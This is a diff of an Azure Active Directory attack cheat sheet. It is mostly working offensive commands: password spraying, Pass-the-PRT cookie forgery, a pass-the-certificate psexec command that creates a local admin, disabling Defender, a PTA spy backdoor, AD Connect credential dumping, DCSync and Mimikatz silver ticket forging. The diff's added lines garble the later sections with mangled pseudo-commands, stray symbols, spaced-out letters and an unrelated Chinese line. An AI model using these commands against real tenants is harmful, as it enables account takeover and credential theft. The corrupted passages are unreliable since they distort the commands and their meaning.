@@ -1,7 +1,4 @@
-# Azure Active Directory
-
-## Summary
-
+# Azure Active Directory## Summary
 * [Azure Recon Tools](#azure-recon-tools)
 * [Enumeration](#enumeration)
     * [Enumerate valid emails](#enumerate-valid-emails)
@@ -174,10 +171,7 @@
     # Administrator
     $ Create-Backdoor, Execute-Backdoor
     ```
-    
-## Enumeration
-
-### Enumerate valid emails
+## Enumeration### Enumerate valid emails
 
 > By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.
 
@@ -312,7 +306,6 @@ PS> az ad signed-in-user show
 # Check AppID Alternative Names/Display Name 
 PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<APP-ID>"} | fl
 
-
 # Get all application objects registered using the current tenant
 PS AzureAD> Get-AzureADApplication -All $true
 
@@ -337,7 +330,6 @@ PS Az> Get-AzStorageAccount | fl
 # List all keyvaults
 PS Az> Get-AzKeyVault
 ```
-
 ## Phishing with Evilginx2
 
 ```powershell
@@ -426,7 +418,6 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
 
 **Mitigation**: Enable `Do not allow user consent` for applications in the "Consent and permissions menu".
 
-
 ## Token from Managed Identity
 
 > **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.
@@ -438,7 +429,6 @@ Most of the time, you want a token for one of these resources:
 * https://vault.azure.net
 * https://graph.microsoft.com
 * https://management.azure.com
-
 
 ### Azure API via Powershell
 
@@ -498,7 +488,6 @@ def main(req: func.HttpRequest) -> func.HttpResponse:
     return func.HttpResponse(val, status_code=200)
 ```
 
-
 ### Get Tokens
 
 :warning: The lifetime of a Primary Refresh Token is 14 days!
@@ -511,7 +500,6 @@ az account get-access-token --resource-type aad-graph
 (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
 # or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT
 ```
-
 ### Use Tokens
 
 > Tokens contain all the claims including that for MFA and Conditional Access
@@ -651,9 +639,7 @@ PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -Resou
 PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
 ```
 
-## Runbook Automation
-
-### Create a Runbook
+## Runbook Automation### Create a Runbook
 
 ```powershell
 # Check user right for automation
@@ -702,7 +688,6 @@ Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -Autom
     $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
     ```
 
-
 ## Virtual Machine RunCommand
 
 Requirements: 
@@ -744,7 +729,6 @@ Import-module MicroBurst.psm1
 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
 ```
 
-
 ## KeyVault Secrets
 
 ```powershell
@@ -780,7 +764,7 @@ Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect
 # Copy the Context, ClearKey and DerivedKey
 Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
 ```
-
+<>
 ```powershell
 # Generate a JWT
 PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
@@ -792,75 +776,61 @@ PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace
 PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
 eyJ0eXAiOiJKV1QiL...
 ```
-
+<>
 The `<Signed JWT>` (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf.    
 Edit the Chrome cookie (F12) -> Application -> Cookies with the values:
-
+<>
 ```powershell
 Name: x-ms-RefreshTokenCredential
 Value: <Signed JWT>
 HttpOnly: √
 ```
-
+<>
 :warning: Mark the cookie with the flags `HTTPOnly` and `Secure`.
-
-
+<>
+~
 ## Pass The Certificate
-
+~~
 ```ps1
 Copy-Item -ToSession $jumpvm -Path C:\Tools\PrtToCertmaster.zip -Destination C:\Users\Username\Documents\username –Verbose
 Expand-Archive -Path C:\Users\Username\Documents\username\PrtToCert-master.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert
-
+<>
 # Require the PRT, TenantID, Context and DerivedKey
 & 'C:\Program Files\Python39\python.exe' C:\Users\Username\Documents\username\PrtToCert\RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
 # PFX saved with the name <Username>@<TENANT NAME>.onmicrosoft.com.pfx and password AzureADCert
 ```
-
-Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine
-
-https://github.com/morRubin/AzureADJoinedMachinePTC
-
-```ps1
-Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
-Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10
-
-python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
+>>> -Evilginx86 --auth RAT run psexec -open cmd.exe ["END", "USER"]
+         --git https://github.com/morRubin/AzureADJoinedMachinePTC```ps1
+>>>Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
+>>>Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10
+>>>Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
 certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
 ```
-
 ## Intunes Administration
-
+<>
+[!]
 Requirements:
 * **Global Administrator** or **Intune Administrator** Privilege : `Get-AzureADGroup -Filter "DisplayName eq 'Intune Administrators'"`
-
 1. Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT
 2. Go to **Devices** -> **All Devices** to check devices enrolled to Intune
 3. Go to **Scripts** and click on **Add** for Windows 10. 
 4. Add a **Powershell script**
 5. Specify **Add all users** and **Add all devices** in the **Assignments** page.
-
 :warning: It will take up to one hour before you script is executed !
-
-
-
+<>
 ## Dynamic Group Membership
-
-Get groups that allow Dynamic membership: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`
-
-Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`    
-Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group
-
+~
+>>> --git group --allow Dynamic_membership::`Get-AzureADMSGroup` | ?{$_.GroupTypes -eq 'DynamicMembership'}`
+            Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`    
+            Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group
 1. Open user's profile, click on **Manage**
 2. Click on **Resend** invite and to get an invitation URL
 3. Set the secondary email
     ```powershell
     PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
     ```
-
 ## Administrative Unit
-
-> Administrative Unit can reset password of another user
-
+> Administrative_Unit -reset0pswd of [USER];
 ```powershell
 PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
 PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
@@ -870,21 +840,16 @@ PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl
 PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
 PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
 ```
-
 ## Deployment Template
-
 ```powershell
 PS Az> Get-AzResourceGroup
 PS Az> Get-AzResourceGroupDeployment -ResourceGroupName SAP
-
 # Export
 PS Az> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
 cat <DEPLOYMENT NAME>.json # search for hardcoded password
 cat <PATH TO .json FILE> | Select-String password
 ```
-
 ## Application Proxy
-
 ```powershell
 # Enumerate application that have Proxy
 PS C:\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
@@ -892,9 +857,7 @@ PS C:\Tools> Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Fina
 PS C:\Tools> . C:\Tools\GetApplicationProxyAssignedUsersAndGroups.ps1
 PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
 ```
-
 ## Conditional Access
-
 * Bypassing conditional access by copying User-Agent (Chrome Dev Tool > Select iPad Pro, etc)
 * Bypassing conditional access by faking device compliance
     ```powershell
@@ -911,86 +874,67 @@ PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
     # Start the call back
     Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
     ```
-
-
 ## Azure AD
-
-With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.
-
-1. Authenticate to your webmail portal (i.e. https://webmail.domain.com/)
-2. Change your browser URL to: https://azure.microsoft.com/
-3. Pick the account from the active sessions
-4. Select Azure Active Directory and enjoy!
-
+[!]
+NYSE::MSFT 
+>>>if (You) [USE] x.srvc*365&O N L I N E, cloud serviceActive Directory (on-prem or in Azure) then, attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD...
+                         <>
+1. 0Auth Web-Mail portal (i.e. https://webmail.domain.com/)
+2. Change URL: https://azure.microsoft.com/
+3. Pick .acc from active sessions
+4. Select A  z  u  r  e Active\Directory[!];
 ### Azure AD vs Active Directory
-
 | Active Directory  | Azure AD  |
 |---|---|
-| LDAP  | REST API'S  |
+| LDAP  | REST API |
 | NTLM/Kerberos  | OAuth/SAML/OpenID |
 | Structured directory (OU tree)  | Flat structure  |
-| GPO  | No GPO's  |
-| Super fine-tuned access controls  | Predefined roles |
+| GPO  | No GPO  |
+| [-]Access C  o  n  t  r  o  l  s  | Predefined roles |
 | Domain/forest  | Tenant  |
-| Trusts  | Guests  |
-
+| [+]Trusts  | [!]Guests  |
+<>
 * Password Hash Syncronization (PHS)
-    * Passwords from on-premise AD are sent to the cloud
-    * Use replication via a service account created by AD Connect
-* Pass Through Authentication (PTA)
-    * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text
-* Connect Windows Server AD to Azure AD using Federation Server (ADFS)
-    * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password
-
-
+    * Passwords from on-premise AD_send\xcloud
+    * Use replication via prog\config\Service\acc.c By AD\Connect (c)
+* --Pass Auth (PTA)
+    * .DLL --SQL from PTA [A G E N T] intercept_authentication_requests::credentials::clear-text
+* Connect Windows Server AD--Azure-AD using Federation Server (ADFS)
+    * Dir-Sync : $Handle By on-premise Windows Server AD (c), $sync $username/password
 * Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large
 * Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large
 * Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large
 * Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large
-
 ### Password Spray
-
 > Default lockout policy of 10 failed attempts, locking out an account for 60 seconds
-
-```powershell
-git clone https://github.com/dafthack/MSOLSpray
-Import-Module .\MSOLSpray.ps1
-Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
-Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
-
+PS> git clone https://github.com/dafthack/MSOLSpray
+>>>Import-Module .\MSOLSpray.ps1
+>>>Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
+>>>Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
 # UserList  - UserList file filled with usernames one-per-line in the format "user@domain.com"
 # Password  - A single password that will be used to perform the password spray.
 # OutFile   - A file to output valid results to.
 # Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.
-# URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
-```
-
-### Convert GUID to SID
-
-The user's AAD id is translated to SID by concatenating `"S-1–12–1-"` to the decimal representation of each section of the AAD Id.
-
+# URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize IP address (You) are 0auth from ..
+~Convert GUID to SID
+["END", "USER","AAD", "ID", "SID", "TRANSLATE"]; 
+$ -cat`"S-1–12–1-"` 0.0.0.1*section*&&AAD%ID
 ```powershell
 GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
 SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
 ```
-
-For example, the representation of `6aa89ecb-1f8f-4d92–810d-b0dce30b6c82` is `S-1–12–1–1789435595–1301421967–3702525313–2188119011`
-
-## Azure AD Connect 
-
-Check if Azure AD Connect is installed : `Get-ADSyncConnector`
-
-* For **PHS**, we can extract the credentials
-* For **PTA**, we can install the agent
-* For **Federation**, we can extract the certificate from ADFS server using DA
-
+For example from *`6aa89ecb-1f8f-4d92–810d-b0dce30b6c82` is `S-1–12–1–1789435595–1301421967–3702525313–2188119011`
+$ Azure_AD --Connect 
+>>> if Azure_AD --Connect_is:$--install:PS>`Get-ADSyncConnector`
+* For **PHS**, extract-cred
+* For **PTA**, --install[A G E N T]
+* For **Federation**, extract cert from ADFS ServEr DA
 ```powershell
 PS > Set-MpPreference -DisableRealtimeMonitoring $true
 PS > Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
 PS > Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
 PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
 PS > Get-AADIntSyncCredentials
-
 # Get Token for SYNC account and reset on-prem admin password
 PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
 PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
@@ -998,75 +942,55 @@ PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
 PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
 PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
 ```
-
 1. Check if PTA is installed : `Get-Command -Module PassthroughAuthPSModule`
 2. Install a PTA Backdoor
     ```powershell
     PS AADInternals> Install-AADIntPTASpy
     PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords
     ```
-
-
-### Azure AD Connect - Password extraction
-
-Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf
-
-Tool | Requires code execution on target | DLL dependencies | Requires MSSQL locally | Requires python locally
+    #Azure_AD--Connect-Password.extraction
+Cred AD Sync :: [!]C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf
+Tool | Require code.exe [NUL] | .DLL/dependencies | Require/MSSQL/locally | -require --py [LOCALE]
 --- | --- | --- | --- | ---
 ADSyncDecrypt | Yes | Yes | No | No
 ADSyncGather | Yes | No | No | Yes
 ADSyncQuery | No (network RPC calls only) | No | Yes | Yes
-
-
 ```powershell
 git clone https://github.com/fox-it/adconnectdump
 # DCSync with AD Sync account
 ```
-
 ### Azure AD Connect - MSOL Account's password and DCSync
-
-You can perform **DCSync** attack using the MSOL account.
-
-Requirements:
-  * Compromise a server with Azure AD Connect service
+(You) **DCSync** attack [USE] MSOL -acc
+Require:
+  * Compromised server with Azure AD Connect service
   * Access to ADSyncAdmins or local Administrators groups
-
-Use the script **azuread_decrypt_msol.ps1** from @xpn to recover the decrypted password for the MSOL account:
-* `azuread_decrypt_msol.ps1`: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
-* `azuread_decrypt_msol_v2.ps1`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
-
-Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.
-
+Use.js **azuread_decrypt_msol.ps1** from @xpnxRecoVer decrypted_password for MSOL acc:
+* `azuread_decrypt_msol.ps1`::AD_Connect_Sync_Cred--Extract -POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
+* `azuread_decrypt_msol_v2.ps1`:: -Upd [METHOD] *** ==dump -- MSOL.SRVC&&acc (which allows a DCSync) use By Azure AD Connect Sync (c)https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
+*Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.
 ### Azure AD Connect - Seamless Single Sign On Silver Ticket
-
-> Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)
-
+> --modPublic@AZURE%ADS%%SOACCS$_acc.imp&PUBLIC  A z u r e A D Kerberos (if no MFA)
 > Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account **AZUREADSSOC** is created in the on-prem AD.
-
-:warning: The password of the AZUREADSSOACC account never changes.
-
-Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure
-
+[!]:warning: 
+                          民众。令牌。使用权。
+[https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure
 1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`. 
     ```powershell
     mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
     ```
-2. AAD logon name of the user we want to impersonate, e.g. `elrond@contoso.com`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
-3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.
-4. Create the Silver Ticket and inject it into Kerberos cache:
-    ```powershell
+2. AAD-logon--name*user.imp, e.g. `elrond@contoso.com` .. this userPrincipalName || mail::attribute from on-prem AD.
+3. SID**user.imp, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`
+4. CreateSilverTicket*inject  K  e  r  b  e  r  o  s.apache::
+[+]    ```powershell
     mimikatz.exe "kerberos::golden /user:elrond
     /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
     /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
     /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
     ```
 5. Launch Mozilla Firefox
-6. Go to about:config and set the `network.negotiate-auth.trusted-uris preference` to value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
-7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.
-
-
+6. Go!about:config[SET]`network.negotiate-auth.trusted-uris preference`===value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
+7. Navigate web.App int "our" AAD.domain.?Fill=user_name::while&leaving@password-field-empty
 ## References
-
 * [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
 * [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
 * [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
